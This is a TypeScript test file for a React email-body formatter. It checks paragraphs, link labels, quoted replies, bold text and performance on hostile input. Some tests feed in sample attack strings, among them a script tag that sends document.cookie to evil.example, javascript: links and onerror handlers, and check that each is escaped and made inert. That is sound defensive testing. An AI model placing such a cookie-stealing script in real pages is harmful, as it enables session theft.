import { isValidElement, type ReactNode } from 'react'
import { describe, expect, it } from 'vitest'
import { formatMessageBody } from './formatMessageBody'

const escape = (text: string) =>
  text
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')

// Markup for what the body holds, written as React writes it: strings are
// escaped text, and every element shows its tag and props. A prop other than
// `className` or `children` would show too, so the assertions see all of it.
function markup(node: ReactNode): string {
  if (Array.isArray(node)) return node.map(markup).join('')
  if (typeof node === 'string') return escape(node)
  if (!isValidElement<Record<string, unknown>>(node) || typeof node.type !== 'string') {
    throw new Error(`Unexpected node: ${JSON.stringify(node)}`)
  }
  const { children, ...props } = node.props
  const attributes = Object.entries(props)
    .map(([name, value]) => ` ${name === 'className' ? 'class' : name}="${escape(String(value))}"`)
    .join('')
  return `<${node.type}${attributes}>${markup(children as ReactNode)}</${node.type}>`
}

const html = (text: string) => markup(formatMessageBody(text))

const tracking =
  'https://click.example.com/ls/click?upn=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMTIzNDU2Nzg5MCJ9.long-opaque-token-that-never-breaks&utm_source=newsletter__sept'

/** Only these tags, with no attribute but the quote's class. */
function expectInert(markup: string) {
  for (const [, tag, attributes] of markup.matchAll(/<(\/?[a-z]+)([^>]*)>/g)) {
    expect(tag?.replace('/', '')).toMatch(/^(p|blockquote|strong)$/)
    expect(attributes === '' || attributes === ' class="message-reader__quote"').toBe(true)
  }
}

describe('formatMessageBody', () => {
  it('makes a paragraph per blank line and keeps single line breaks', () => {
    expect(html('Hi Wesley,\n\nLine one\nLine two\r\n\r\n\n  \nRegards,\nMarit')).toBe(
      '<p>Hi Wesley,</p><p>Line one\nLine two</p><p>Regards,\nMarit</p>',
    )
  })

  it('shows a link label instead of a long tracking URL', () => {
    const markup = html(`[Read the article](${tracking}) and [more](<${tracking}>)`)
    expect(markup).toBe('<p>Read the article and more</p>')
    expect(markup).not.toContain('example.com')
  })

  it('keeps balanced parentheses in a URL out of the text', () => {
    expect(html('See [the wiki](https://en.example.org/wiki/Mail_(protocol)).')).toBe(
      '<p>See the wiki.</p>',
    )
  })

  it('shows the hostname for an empty label, and never loads images', () => {
    expect(html('[](https://www.example.org/unsubscribe?u=1) · [ ](http://news.example.net)')).toBe(
      '<p>example.org · news.example.net</p>',
    )
    expect(html(`[![](https://cdn.example.com/logo.png)](${tracking})`)).toBe(
      '<p>click.example.com</p>',
    )
    expect(html(`[![Studio Noord](https://cdn.example.com/logo.png)](${tracking})`)).toBe(
      '<p>Studio Noord</p>',
    )
    expect(html('![chart](https://cdn.example.com/c.png) up 4%')).toBe('<p>chart up 4%</p>')
  })

  it('drops a paragraph that only held an image without words', () => {
    expect(html('Hi\n\n![](https://tracker.example/pixel.gif?id=42)\n\nBye')).toBe(
      '<p>Hi</p><p>Bye</p>',
    )
  })

  it('shows the real host, not a lookalike in the user part', () => {
    expect(html('[](https://bank.example.com@evil.example/login)')).toBe('<p>evil.example</p>')
  })

  it('keeps the label of a javascript: or data: link as text, and nothing else', () => {
    const markup = html(
      '[Verify your account](javascript:alert(1)) [Open](data:text/html;base64,PHNjcmlwdD4=)',
    )
    expect(markup).toBe('<p>Verify your account Open</p>')
    expectInert(markup)
  })

  it('leaves an empty-label link to another scheme as written', () => {
    expect(html('[](javascript:alert(1)) [](data:text/html,x) [](mailto:a@example.com)')).toBe(
      '<p>[](javascript:alert(1)) [](data:text/html,x) [](mailto:a@example.com)</p>',
    )
  })

  it('leaves malformed and nested link syntax as text', () => {
    const cases = [
      '[unfinished](https://example.com',
      '[no target]',
      '[spaced] (https://example.com)',
      '[two words](https://example.com/a b)',
      '[a [nested] label](https://example.com)',
      '[line\nbreak](https://example.com)',
      '[title](https://example.com "Title")',
      '[unbalanced](https://example.com/a(b)',
    ]
    for (const text of cases) {
      expect(html(text)).toBe(`<p>${text.replaceAll('"', '&quot;')}</p>`)
    }
  })

  it('removes bold markers only when both ends are clear', () => {
    expect(
      html('**Three workplaces.** Then __one idea__, and **[a link](https://x.example)**'),
    ).toBe(
      '<p><strong>Three workplaces.</strong> Then <strong>one idea</strong>, and <strong>a link</strong></p>',
    )
    const unchanged = [
      '2**8**2',
      'snake__case__name',
      '** spaced **',
      '**unclosed',
      '***triple***',
      '**across\nlines**',
      '*single* and _single_',
      '**a*b**',
    ]
    for (const text of unchanged) expect(html(text)).toBe(`<p>${text}</p>`)
  })

  it('keeps underscores inside a URL', () => {
    expect(html(`[](https://example.com/__init__/a__b__c) ${tracking}`)).toBe(
      `<p>example.com ${tracking.replaceAll('&', '&amp;')}</p>`,
    )
  })

  it('handles Unicode labels, hosts and text', () => {
    expect(html('**Zaterdag 27 september** in Utrecht 🎉 [Café ☕](https://example.com/c)')).toBe(
      '<p><strong>Zaterdag 27 september</strong> in Utrecht 🎉 Café ☕</p>',
    )
    // An international host shows in its ASCII form, which can't pass for another.
    expect(html('[](https://bücher.example/)')).toBe('<p>xn--bcher-kva.example</p>')
    expect(html('**é**x')).toBe('<p>**é**x</p>')
  })

  it('keeps quoted replies, nested, with their line breaks', () => {
    expect(
      html(
        'Sounds good.\n\n> On Monday, Marit wrote:\n> Could you send it?\n>\n> > Earlier: [the brief](https://docs.example.com/b)\n> > Thanks\n\nWesley',
      ),
    ).toBe(
      '<p>Sounds good.</p>' +
        '<blockquote class="message-reader__quote">' +
        '<p>On Monday, Marit wrote:\nCould you send it?</p>' +
        '<blockquote class="message-reader__quote"><p>Earlier: the brief\nThanks</p></blockquote>' +
        '</blockquote>' +
        '<p>Wesley</p>',
    )
  })

  it('stops nesting quotes at eight levels and shows the rest as text', () => {
    const markup = html(`${'>'.repeat(10)} deep`)
    expect(markup.match(/<blockquote/g)).toHaveLength(8)
    expect(markup).toContain('<p>&gt;&gt; deep</p>')
  })

  it('shows raw HTML as escaped text and adds no active content', () => {
    const text = [
      '<script>fetch("https://evil.example/?c=" + document.cookie)</script>',
      '<img src="https://tracker.example/p.gif" onerror="alert(1)">',
      '<a href="javascript:alert(1)">Verify</a> [**<b>x</b>**](https://x.example)',
      '> <iframe src="https://evil.example"></iframe>',
    ].join('\n\n')
    const markup = html(text)
    expectInert(markup)
    expect(markup).toContain('&lt;script&gt;fetch(')
    expect(markup).toContain('&lt;img src=&quot;https://tracker.example/p.gif&quot;')
    expect(markup).toContain('&lt;a href=&quot;javascript:alert(1)&quot;&gt;Verify&lt;/a&gt;')
    expect(markup).toContain('<strong>&lt;b&gt;x&lt;/b&gt;</strong>')
  })

  it('returns nothing for an empty body', () => {
    expect(formatMessageBody('')).toEqual([])
    expect(formatMessageBody(' \n\n\t')).toEqual([])
  })

  it('stays fast on long, hostile input', () => {
    const inputs = [
      '['.repeat(50_000),
      `[${'a'.repeat(50_000)}](`,
      `[a](${'('.repeat(50_000)}`,
      '**a '.repeat(20_000),
      `${'> '.repeat(20_000)}x`,
      `[![${'!['.repeat(20_000)}`,
    ]
    const started = performance.now()
    const blocks = inputs.map((text) => formatMessageBody(text).length)
    expect(performance.now() - started).toBeLessThan(1000)
    expect(blocks.every((count) => count > 0)).toBe(true)
  })
})
